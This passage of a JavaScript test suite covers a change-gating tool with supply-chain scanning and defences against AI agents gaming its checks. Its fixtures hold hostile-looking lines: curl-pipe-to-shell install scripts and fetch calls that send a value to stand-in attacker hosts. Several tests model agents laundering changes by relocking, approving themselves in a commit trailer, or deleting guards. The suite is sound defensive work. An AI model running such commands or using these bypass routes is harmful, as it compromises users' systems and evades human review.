  r = pw(d, ['run', '--base', base2, '--head', raised2, '--detect-gaming', '--no-record']);
  assert.equal(r.code, 2, r.out); assert.match(r.out, /GAMED/);   // budget.json is now non-source -> zero source edits -> gamed
  rmSync(d, { recursive: true, force: true });
});

// ----------------------------------------------------------- integration: --working
test('run --working: measures uncommitted change, leaves tree untouched, writes nothing to the repo', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); // uncommitted improvement
  const r = pw(d, ['run', '--working']);
  assert.equal(r.code, 0);
  assert.equal(readFileSync(join(d, 'app.js'), 'utf8').includes('TODO'), false); // tree still has the change
  assert.ok(!existsSync(join(d, '.promptwheel')));                                // no record, no directory
  rmSync(d, { recursive: true, force: true });
});

// -------------------------------------- R2: --working sees newly added (untracked) files
test('run --working: SEES newly added untracked files (the dominant agent action)', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'base');   // 0 TODOs committed
  writeFileSync(join(d, 'new.js'), 'x // TODO\n');                    // untracked new file
  const r = pw(d, ['run', '--working', '--no-record']);
  assert.equal(r.code, 1);                       // todos 0->1 guarded regression, only visible if untracked is snapshotted
  assert.ok(existsSync(join(d, 'new.js')));       // working tree untouched
  rmSync(d, { recursive: true, force: true });
});

// --------------------------------------------------------------- R4: init + presets
test('init: a Rust workspace is tested with --workspace (plain cargo test ran 446 of ripgrep\'s 1246 tests, 321 of regex\'s 1410); a single crate keeps cargo test', () => {
  const tomls = { crate: '[package]\nname = "a"\nversion = "0.1.0"\n', rootpkg: '[package]\nname = "a"\nversion = "0.1.0"\n\n[workspace]\nmembers = ["crates/*"]\n', virtual: '[workspace]\nmembers = ["crates/*"]\n' };
  const want = { crate: 'cargo test', rootpkg: 'cargo test --workspace', virtual: 'cargo test --workspace' };
  for (const [k, toml] of Object.entries(tomls)) {
    const d = mkdtempSync(join(tmpdir(), 'pw-cargo-')); const g = (a) => execFileSync('git', a, { cwd: d });
    g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
    writeFileSync(join(d, 'Cargo.toml'), toml); commitAll(d, 'base');
    assert.equal(pw(d, ['init']).code, 0, k);
    assert.equal(JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).metrics.find((m) => m.name === 'tests_pass').cmd, want[k], k);
    rmSync(d, { recursive: true, force: true });
  }
});
test('init: writes a starter config for the stack, refuses overwrite without --force', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-init-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"exit 0"}}');
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  let r = pw(d, ['init']);
  assert.equal(r.code, 0); assert.ok(existsSync(join(d, 'promptwheel.config.json')));
  const written = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).metrics;
  assert.ok(written.some((m) => m.name === 'tests_pass'));
  assert.ok(written.some((m) => m.name === 'assertions'), 'default config includes antihack tripwires');
  assert.match(written.find((m) => m.name === 'suppressions').cmd, /nosec/, 'suppression tripwire also greps bandit-style # nosec');
  assert.ok(!written.some((m) => m.name === 'lint_errors'), 'no lint metric when eslint is absent');
  assert.equal(pw(d, ['init']).code, 64);         // refuses overwrite (usage error, never a verdict code)
  assert.equal(pw(d, ['init', '--list']).code, 0); // catalog
  rmSync(d, { recursive: true, force: true });
});

test('init: writes the agent gate block to AGENTS.md (idempotent; --no-agent-block skips)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-agentblock-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"exit 0"}}');
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  assert.equal(pw(d, ['init']).code, 0);
  let agents = readFileSync(join(d, 'AGENTS.md'), 'utf8');
  assert.match(agents, /<!-- promptwheel:gate -->/, 'wrote the sentinel-delimited gate block');
  assert.match(agents, /promptwheel run --working/, 'the block tells the agent when to run the gate');
  assert.equal(pw(d, ['init', '--force']).code, 0);
  agents = readFileSync(join(d, 'AGENTS.md'), 'utf8');
  assert.equal((agents.match(/<!-- promptwheel:gate -->/g) || []).length, 1, 'idempotent: one block, not duplicated');
  const d2 = mkdtempSync(join(tmpdir(), 'pw-noblock-'));
  const g2 = (a) => execFileSync('git', a, { cwd: d2 });
  g2(['init', '-q']); g2(['config', 'user.email', 't@t']); g2(['config', 'user.name', 't']);
  writeFileSync(join(d2, 'package.json'), '{"name":"x","scripts":{"test":"exit 0"}}'); writeFileSync(join(d2, 'a.js'), '1\n'); commitAll(d2, 'base');
  assert.equal(pw(d2, ['init', '--no-agent-block']).code, 0);
  assert.ok(!existsSync(join(d2, 'AGENTS.md')), '--no-agent-block writes no AGENTS.md');
  rmSync(d, { recursive: true, force: true }); rmSync(d2, { recursive: true, force: true });
});

test('init --preset supply-chain: the pack is copied from the package into .promptwheel and measured from there; an ignored .promptwheel/ is warned about', () => {
  // the designed path: the pack is committed with the config, so the worktrees contain it and
  // the metric measures the real count (an npm user has no packs/ directory of their own)
  const d = mkdtempSync(join(tmpdir(), 'pw-scpack-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"postinstall":"node x.js"}}\n'); commitAll(d, 'base: an install script');
  let r = pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']);
  assert.equal(r.code, 0, r.out);
  assert.doesNotMatch(r.out, /gitignored/, 'nothing is ignored here, so no warning');
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.equal(cfg.metrics.find((m) => m.name === 'lifecycle_scripts').cmd, 'node .promptwheel/packs/supply-chain/scan.mjs lifecycle .', 'the preset command is rewritten to the copied pack');
  assert.ok(existsSync(join(d, '.promptwheel/packs/supply-chain/lock.mjs')), 'the whole pack is copied, not just the scanner');
  commitAll(d, 'config + pack');
  writeFileSync(join(d, 'package.json'), '{"name":"x"}\n'); commitAll(d, 'drop the install script');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /lifecycle_scripts\s+1 →\s+0 .*improved/, 'the copied scanner ran in the worktrees and measured 1 -> 0');
  // the trap: with .promptwheel/ ignored the pack never reaches a worktree and the metric reads
  // unmeasurable at both refs; init must say so instead of leaving a FAIL with no hint why
  const d2 = mkdtempSync(join(tmpdir(), 'pw-scpack-ign-'));
  const g2 = (a) => execFileSync('git', a, { cwd: d2 });
  g2(['init', '-q']); g2(['config', 'user.email', 't@t']); g2(['config', 'user.name', 't']);
  writeFileSync(join(d2, '.gitignore'), '.promptwheel/\n'); writeFileSync(join(d2, 'a.js'), '1\n'); commitAll(d2, 'base');
  r = pw(d2, ['init', '--preset', 'supply-chain', '--no-agent-block']);
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /\.promptwheel\/packs\/supply-chain is gitignored/, 'init warns that the copied pack will not reach the measurement worktrees');
  assert.match(r.out, /!\.promptwheel\/packs\//, 'and names the .gitignore rule that fixes it');
  rmSync(d, { recursive: true, force: true }); rmSync(d2, { recursive: true, force: true });
});

// ------------------------------------------- supply-chain pack + preset (paths and counts, held)
const SC_SCAN = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'scan.mjs');
const scan = (what, dir) => { try { return { out: execFileSync('node', [SC_SCAN, what, dir], { encoding: 'utf8' }).trim(), code: 0 }; } catch (e) { return { out: `${e.stdout || ''}${e.stderr || ''}`, code: e.status }; } };

test('supply-chain pack: unpinned execution and install policy are counted, pinned references are not', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-sc-pin-'));
  mkdirSync(join(d, '.github/workflows'), { recursive: true }); mkdirSync(join(d, 'scripts'));
  const sha = 'a'.repeat(40);
  writeFileSync(join(d, '.github/workflows/ci.yml'), ['jobs:', '  a:', '    steps:', '      - uses: actions/checkout@v4', `      - uses: actions/setup-node@${sha}`, '      - uses: ./local-action', '      # - uses: commented/out@v1', '      - run: npx -y sawbuck debt', '      - run: npx -y sawbuck@0.1.32 debt', '      - run: curl -s https://x.example/i.sh | bash', '      - run: npm install -g tool'].join('\n'));
  writeFileSync(join(d, 'action.yml'), 'runs:\n  steps:\n    - run: pnpm dlx thing@latest\n');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ devDependencies: { tsc: '1' }, scripts: { b: 'npx tsc', c: 'npx cowsay' } }));
  writeFileSync(join(d, 'scripts/go.sh'), '#!/bin/sh\n# npx comment\nnpx --yes @scope/pkg@1.2.3\n');
  assert.equal(scan('unpinned', d).out, '6', 'tag action, npx, curl pipe, global install, dlx latest, undeclared npx');
  assert.equal(scan('policy', d).out, '2');
  writeFileSync(join(d, '.npmrc'), 'ignore-scripts=true\nmin-release-age=3\n');
  assert.equal(scan('policy', d).out, '0');
});

test('lock: the same tree writes the same bytes, ordinary edits do not drift, structure does', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-lock-'));
  execFileSync('git', ['init', '-q'], { cwd: d });
  mkdirSync(join(d, 'src/api'), { recursive: true }); mkdirSync(join(d, 'src/db')); mkdirSync(join(d, 'src/auth')); mkdirSync(join(d, 'src/app/billing'), { recursive: true }); mkdirSync(join(d, '.github/workflows'), { recursive: true }); mkdirSync(join(d, 'test'));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', bin: { a: 'x.js' }, exports: { '.': './x.js' }, dependencies: { left: '1' } }));
  writeFileSync(join(d, 'src/api/h.js'), "import { q } from '../db/q.js';\napp.get('/users', h);\nconst u = 'https://api.stripe.com/v1';\n// see https://in-a-comment.dev/x\n");
  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 1;\n');
  writeFileSync(join(d, 'src/auth/a.js'), 'export const a = 1;\n');
  writeFileSync(join(d, 'src/app/billing/route.ts'), 'export const GET = 1;\n');
  writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\n');
  writeFileSync(join(d, 'test/h.test.js'), "fetch('https://only-in-a-test.dev/')\n");
  const lockTool = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'lock.mjs');
  const write = () => execFileSync('node', [lockTool, 'write', d], { encoding: 'utf8' });
  const drift = () => execFileSync('node', [lockTool, 'drift', d], { encoding: 'utf8' }).trim();
  write(); const first = readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'); write();
  assert.equal(readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'), first, 'no timestamp: deterministic bytes');
  const items = JSON.parse(first).items;
  for (const i of ['dep:left', 'entry:bin:a', 'entry:export:.', 'workflow:.github/workflows/ci.yml', 'module:src/api', 'edge:src/api>src/db', 'route:GET /users', 'route:/billing', 'host:api.stripe.com']) assert.ok(items.includes(i), i);
  assert.ok(!items.some((i) => /in-a-comment|only-in-a-test/.test(i)), 'comments and tests add no hosts');
  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 2; // an ordinary edit\n');
  assert.equal(drift(), '0');
  writeFileSync(join(d, 'src/db/q.js'), "import { a } from '../auth/a.js';\nexport const q = fetch('https://evil.example.net/x?e=' + a);\n");
  assert.equal(drift(), '2', 'the new edge and first network use; example.net is reserved and not a host');
  writeFileSync(join(d, 'src/db/q.js'), "export const q = fetch('https://exfil.attacker.dev/x');\n");
  assert.equal(drift(), '2', 'the new host and first network use');
  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 2;\n');
  mkdirSync(join(d, 'src/app/reports'));
  writeFileSync(join(d, 'src/app/reports/route.ts'), 'export const GET = 1;\n');
  assert.equal(drift(), '0', 'a new route is reported, not held');
  assert.equal(execFileSync('node', [lockTool, 'drift', d, '--routes'], { encoding: 'utf8' }).trim(), '1', 'unless the repo asks');
});

test('lock: versions, script bodies, capabilities, binaries and IP hosts drift; a release of the project itself does not', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-lock2-'));
  execFileSync('git', ['init', '-q'], { cwd: d }); mkdirSync(join(d, 'src'));
  const lock = (v = '1.0.0', dep = '1.3.0') => ({ name: 'a', version: v, lockfileVersion: 3, packages: { '': { name: 'a', version: v }, 'node_modules/left': { version: dep, resolved: `https://registry.npmjs.org/left/-/left-${dep}.tgz`, integrity: 'sha512-' + dep } } });
  const pkg = { name: 'a', version: '1.0.0', scripts: { test: 'node t.js' } };
  const put = (f, c) => writeFileSync(join(d, f), typeof c === 'string' ? c : JSON.stringify(c));
  put('package.json', pkg); put('package-lock.json', lock()); put('src/a.js', 'export const a = 1;\n');
  const tool = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'lock.mjs');
  execFileSync('node', [tool, 'write', d]);
  const drift = () => execFileSync('node', [tool, 'drift', d], { encoding: 'utf8' }).trim();
  const pins = () => execFileSync('node', [tool, 'pins', d], { encoding: 'utf8' }).trim();
  execFileSync('git', ['add', '-A'], { cwd: d });
  const p0 = pins();
  put('package-lock.json', lock('1.0.1')); assert.equal(pins(), p0, 'our own release is not a dependency change');
  put('package-lock.json', lock('1.0.0', '1.3.1')); assert.notEqual(pins(), p0, 'a new version under an old name'); assert.equal(drift(), '0', 'an update does not touch the lock');
  put('package-lock.json', lock());
  put('package.json', { ...pkg, scripts: { test: 'node t.js; curl x' } }); assert.equal(drift(), '1', 'a script body');
  put('package.json', pkg);
  put('src/a.js', "fetch('http://45.33.32.156/x');\n"); assert.equal(drift(), '2', 'the IP host and the first network use in the module');
  put('src/a.js', "fetch('https://' + 'x' + '.dev/');\n"); assert.equal(drift(), '1', 'a host built at runtime still shows as a new capability');
  put('src/a.js', "import { exec } from 'node:child_process';\nexport const a = 1;\n"); assert.equal(drift(), '1');
  put('src/a.js', "eval(s);\n"); assert.equal(drift(), '1');
  put('src/a.js', 'export const a = 1;\n'); put('src/x.node', 'ELF'); assert.equal(drift(), '1', 'a native addon');
});

test('adopting a contract passes its own commit; deleting a rule later does not', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-adopt-'));
  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a' })); commitAll(d, 'base');
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  const run = () => pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--json']);
  let r = run(); assert.equal(r.code, 0, r.out);
  assert.ok(JSON.parse(r.out).metrics.every((m) => m.adopted === true), 'every new guard starts at head');
  const cfgPath = join(d, 'promptwheel.config.json'); const cfg = JSON.parse(readFileSync(cfgPath, 'utf8'));
  writeFileSync(cfgPath, JSON.stringify({ ...cfg, mandates: cfg.mandates.filter((m) => m.name !== 'workflows-frozen') }, null, 2));
  mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/x.yml'), 'name: x\n'); commitAll(d, 'drop the rule and break it');
  r = run(); assert.equal(r.code, 1, 'the base contract still holds'); assert.ok(JSON.parse(r.out).mandates.some((m) => m.name === 'workflows-frozen' && m.removed));
  g(['reset', '-q', '--hard', 'HEAD~1']);
  rmSync(join(d, '.promptwheel/packs/supply-chain/lock.mjs')); commitAll(d, 'delete a scanner the contract already had');
  assert.equal(run().code, 1, 'an existing guard that cannot be measured still fails');
});

test('pins: an approved update does not blind the next one', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-pins-'));
  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
  const lock = (v) => JSON.stringify({ name: 'a', lockfileVersion: 3, packages: { '': { name: 'a' }, 'node_modules/left': { version: v, resolved: `https://registry.npmjs.org/left/-/left-${v}.tgz`, integrity: 'sha512-' + v } } });
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', dependencies: { left: '^1.0.0' } })); writeFileSync(join(d, 'package-lock.json'), lock('1.0.0'));
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'base');
  const lockBefore = readFileSync(join(d, 'promptwheel.lock.json'), 'utf8');
  writeFileSync(join(d, 'package-lock.json'), lock('1.0.1')); commitAll(d, 'update');
  const run = (...e) => pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', ...e]).code;
  assert.equal(run(), 1, 'an update needs a reason');
  assert.equal(run('--allow', 'reviewed update'), 0);
  assert.equal(readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'), lockBefore, 'and the lock did not change');
  writeFileSync(join(d, 'package-lock.json'), lock('1.0.2')); commitAll(d, 'a malicious update after the approved one');
  assert.equal(run(), 1, 'the next change is still caught');
});

test('lock: an agent cannot launder a change by updating the lock; a person can, with --allow; a trailer cannot', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-lockflow-'));
  execFileSync('git', ['init', '-q'], { cwd: d }); execFileSync('git', ['config', 'user.email', 'a@b.c'], { cwd: d }); execFileSync('git', ['config', 'user.name', 'a'], { cwd: d });
  mkdirSync(join(d, 'src'));
  writeFileSync(join(d, 'src/a.js'), 'export const a = 1;\n');
  const pkg = { name: 'x', dependencies: { left: '1.0.0' } };
  writeFileSync(join(d, 'package.json'), JSON.stringify(pkg));
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0);
  assert.ok(existsSync(join(d, 'promptwheel.lock.json')), 'init writes the lock');
  commitAll(d, 'contract');
  const relock = () => assert.equal(pw(d, ['lock']).code, 0);
  writeFileSync(join(d, 'package.json'), JSON.stringify({ ...pkg, dependencies: { ...pkg.dependencies, evil: '1.0.0' } }));
  relock();
  // the drift reads 0 (the lock was updated) and the dependency count is the only other signal; the mandate catches the lock edit
  let r = pw(d, ['run', '--working', '--no-record', '--json']);
  assert.equal(r.code, 1, r.out);
  const rep = JSON.parse(r.out.slice(r.out.indexOf('{')));
  assert.ok(rep.mandates.some((m) => m.name === 'lock-frozen'), 'the lock edit is the violation');
  commitAll(d, 'add evil and relock\n\nPromptwheel-Allow: an agent approving itself');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 1, 'a trailer clears neither the mandate nor the guards');
  // a dependency and the lock are two things: a reason that names neither lets neither through
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'reviewed: needed for X']);
  assert.equal(r.code, 1, r.out); assert.deepEqual(JSON.parse(r.out).allowable, ['dependency_entries', 'mandate:lock-frozen']);
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'dependency_entries, lock-frozen: reviewed, needed for X']);
  assert.equal(r.code, 0, r.out);
  assert.ok(JSON.parse(r.out).allowed.cleared.includes('mandate:lock-frozen'));
});

test('supply-chain pack: the three counters on fixtures (manifests; npm, pnpm, yarn classic and yarn berry locks)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-sc-scan-'));
  mkdirSync(join(d, 'packages/a'), { recursive: true }); mkdirSync(join(d, 'node_modules/x'), { recursive: true }); mkdirSync(join(d, 'berry'));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'root', dependencies: { 'left-pad': '^1', lodash: '^4' }, scripts: { test: 'node t.mjs', build: 'echo', prepare: '' } }));
  writeFileSync(join(d, 'packages/a/package.json'), JSON.stringify({ name: 'a', devDependencies: { vitest: '^1' }, scripts: { postinstall: 'node evil.js', prepare: 'husky' } }));
  writeFileSync(join(d, 'node_modules/x/package.json'), JSON.stringify({ scripts: { postinstall: 'x' }, dependencies: { q: '1' } }));   // never walked
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: {
    '': { name: 'root' },
    'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-abc' },
    'node_modules/lodash': { version: '4.17.21', resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz' },             // registry, no integrity
    'node_modules/evil': { version: '1.0.0', resolved: 'git+ssh://git@github.com/x/evil.git#deadbeef' },                           // git
    'node_modules/a': { resolved: 'packages/a', link: true },                                                                       // a workspace link is not a source
    'packages/a': { name: 'a', version: '1.0.0' } } }));
  writeFileSync(join(d, 'packages/a/pnpm-lock.yaml'), "lockfileVersion: '9.0'\npackages:\n  lodash@4.17.21:\n    resolution: {integrity: sha512-abc}\n  evil@1.0.0:\n    resolution: {tarball: https://github.com/x/evil/archive/main.tar.gz}\n  other@1.0.0:\n    resolution: {commit: deadbeef, repo: git@github.com:x/other.git, type: git}\n");
  writeFileSync(join(d, 'yarn.lock'), '# yarn lockfile v1\n\nleft-pad@^1.0.0:\n  version "1.3.0"\n  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#abc"\n  integrity sha512-abc\n\nlodash@^4:\n  version "4.17.21"\n  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#def"\n\nevil@github:x/evil:\n  version "1.0.0"\n  resolved "https://codeload.github.com/x/evil/tar.gz/deadbeef"\n');
  writeFileSync(join(d, 'berry/yarn.lock'), '__metadata:\n  version: 8\n\n"left-pad@npm:^1.0.0":\n  version: 1.3.0\n  resolution: "left-pad@npm:1.3.0"\n  checksum: abc\n\n"a@workspace:packages/a":\n  version: 0.0.0-use.local\n  resolution: "a@workspace:packages/a"\n\n"evil@https://github.com/x/evil.git#commit=deadbeef":\n  version: 1.0.0\n  resolution: "evil@https://github.com/x/evil.git#commit=deadbeef"\n');
  assert.equal(scan('lifecycle', d).out, '2', 'postinstall + a non-empty prepare; an empty prepare and node_modules do not count');
  assert.equal(scan('deps', d).out, '3', 'two root dependencies + one nested devDependency');
  assert.equal(scan('lock-sources', d).out, '7', 'npm: git + no integrity (the link skipped); pnpm: tarball + commit; yarn classic: codeload + no integrity; berry: git');
  assert.equal(scan('nope', d).code, 64, 'a typo in the config reads as unmeasurable, never as a clean 0');
  rmSync(d, { recursive: true, force: true });
});

test('init --preset supply-chain: the held counts, the lock, the mandates, the contract as an evaluatorPath, the pack copied once', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-sc-init-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'demo', scripts: { test: 'node -e 0' }, dependencies: {} }, null, 2) + '\n');
  commitAll(d, 'base');
  const r = pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']);
  assert.equal(r.code, 0, r.out);
  assert.equal((r.out.match(/installed packs\/supply-chain/g) || []).length, 1, 'one pack, announced once, however many metrics run it');
  assert.match(pw(d, ['init', '--list']).out, /supply-chain\s+gate: no new lifecycle scripts/);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.deepEqual(cfg.metrics.map((m) => m.name), ['lifecycle_scripts', 'dependency_entries', 'lock_nonregistry_sources', 'unpinned_execution', 'install_policy_gaps', 'lock_drift', 'pins_changed']);
  assert.ok(cfg.metrics.every((m) => m.guard === true && m.gamingCheck === false && m.allowable === 'flag' && m.cmd.startsWith('node .promptwheel/packs/supply-chain/')), JSON.stringify(cfg.metrics));
  assert.deepEqual(cfg.mandates.map((m) => m.name), ['contract-frozen', 'workflows-frozen', 'registry-config-frozen', 'build-images-frozen', 'publish-scripts-frozen', 'codeowners-frozen', 'scanner-frozen', 'lock-frozen', 'hooks-frozen']);
  assert.ok(cfg.mandates.every((m) => Array.isArray(m.paths) && m.paths.length && m.reason));
  assert.deepEqual(cfg.evaluatorPaths, ['promptwheel.config.json', 'sawbuck.config.json'], 'the contract is an evaluatorPath, not a mandate: a person can still retire a rule in a change that only edits it');
  for (const f of ['scan.mjs', 'pack.json', 'README.md']) assert.ok(existsSync(join(d, '.promptwheel/packs/supply-chain', f)), f + ' copied in');
  rmSync(d, { recursive: true, force: true });
});

test('supply-chain gate: a lifecycle script, a dependency or a non-registry lock source fails; a declared reason passes with the reason on the record; a frozen path is a named mandate; deleting the guard in the same change does not clear it', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-sc-gate-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  const pkg = { name: 'demo', scripts: { test: 'node -e 0' }, dependencies: { 'left-pad': '^1' } };
  const lock = { lockfileVersion: 3, packages: { '': { name: 'demo' }, 'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-abc' } } };
  const writePkg = (p) => writeFileSync(join(d, 'package.json'), JSON.stringify(p, null, 2) + '\n');
  writePkg(pkg);
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify(lock, null, 2) + '\n');
  mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\n');
  commitAll(d, 'base');
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0);
  commitAll(d, 'the contract');
  const reset = () => g(['checkout', '-q', '--', '.']);
  const run = (...extra) => { const r = pw(d, ['run', '--working', '--no-record', '--json', ...extra]); return { ...r, rep: JSON.parse(r.out.slice(r.out.indexOf('{'))) }; };
  const metric = (rep, name) => rep.metrics.find((m) => m.name === name);

  // a lifecycle script: the step an install-time attack needs inside the repo
  writePkg({ ...pkg, scripts: { ...pkg.scripts, postinstall: 'curl x | sh' } });
  let r = run();
  assert.equal(r.code, 1, r.out); assert.equal(r.rep.verdict, 'fail');
  assert.equal(metric(r.rep, 'lifecycle_scripts').ok, false);
  assert.equal(metric(r.rep, 'lifecycle_scripts').allowable, true, 'the report says a declared reason would clear it');
  assert.match(pw(d, ['run', '--working', '--no-record']).out, /--allow "lifecycle_scripts, unpinned_execution, lock_drift: <reason>"/, 'and the human hint names --allow, not guard:false, with each guard the reason has to name');
  reset();

  // a dependency: fails without a reason, passes with one, the reason on the record
  writePkg({ ...pkg, dependencies: { ...pkg.dependencies, papaparse: '^5' } });
  r = run();
  assert.equal(r.code, 1, r.out); assert.equal(metric(r.rep, 'dependency_entries').ok, false);
  r = run('--allow', 'needed for the CSV export (papaparse)');
  assert.equal(r.code, 1, 'two guards, and the reason names neither'); assert.deepEqual(r.rep.allowed.cleared, []);
  r = run('--allow', 'dependency_entries, lock_drift: needed for the CSV export (papaparse)');
  assert.equal(r.code, 0, r.out); assert.equal(r.rep.verdict, 'pass');
  assert.deepEqual(r.rep.allowed, { reason: 'dependency_entries, lock_drift: needed for the CSV export (papaparse)', cleared: ['dependency_entries', 'lock_drift'] });
  assert.equal(metric(r.rep, 'dependency_entries').ok, true); assert.equal(metric(r.rep, 'dependency_entries').allowed, true);
  assert.equal(metric(r.rep, 'dependency_entries').allowable, undefined, 'cleared, so no longer flagged as awaiting a reason');
  // an agent can write a commit trailer, so a trailer never clears these guards: only the --allow flag does
  commitAll(d, 'add papaparse\n\nPromptwheel-Allow: an agent approving itself');
  const rr = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(rr.code, 1, rr.out);
  assert.equal(JSON.parse(rr.out).allowed, undefined);
  const rf = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'dependency_entries and lock_drift: a person read it']);
  assert.equal(rf.code, 0, rf.out);
  g(['reset', '-q', '--hard', 'HEAD~1']);

  // a non-registry lock source
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ ...lock, packages: { ...lock.packages, 'node_modules/evil': { version: '1.0.0', resolved: 'git+ssh://git@github.com/x/evil.git#deadbeef' } } }, null, 2) + '\n');
  r = run();
  assert.equal(r.code, 1, r.out); assert.equal(metric(r.rep, 'lock_nonregistry_sources').ok, false);
  reset();

  // a frozen path: a named mandate fails the gate whatever the metrics read
  writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\non: push\nsteps: [{ run: "curl x | sh" }]\n');
  r = run();
  assert.equal(r.code, 1, r.out); assert.equal(r.rep.verdict, 'fail');
  assert.equal(r.rep.mandates[0].name, 'workflows-frozen'); assert.ok(r.rep.mandates[0].files.includes('.github/workflows/ci.yml'));
  reset();

  // deleting the lifecycle guard in the same change that adds the script: the committed contract holds
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, metrics: cfg.metrics.filter((m) => m.name !== 'lifecycle_scripts') }, null, 2) + '\n');
  writePkg({ ...pkg, scripts: { ...pkg.scripts, postinstall: 'curl x | sh' } });
  r = run();
  assert.notEqual(r.rep.verdict, 'pass', r.out);
  assert.ok(r.rep.gate && Array.isArray(r.rep.gate.weakened) && r.rep.gate.weakened.some((w) => w.name === 'lifecycle_scripts'), 'the dropped guard is re-measured under its committed definition: ' + JSON.stringify(r.rep.gate));
  reset();

  // a change that only edits the contract fails, and a person retires a rule with --allow
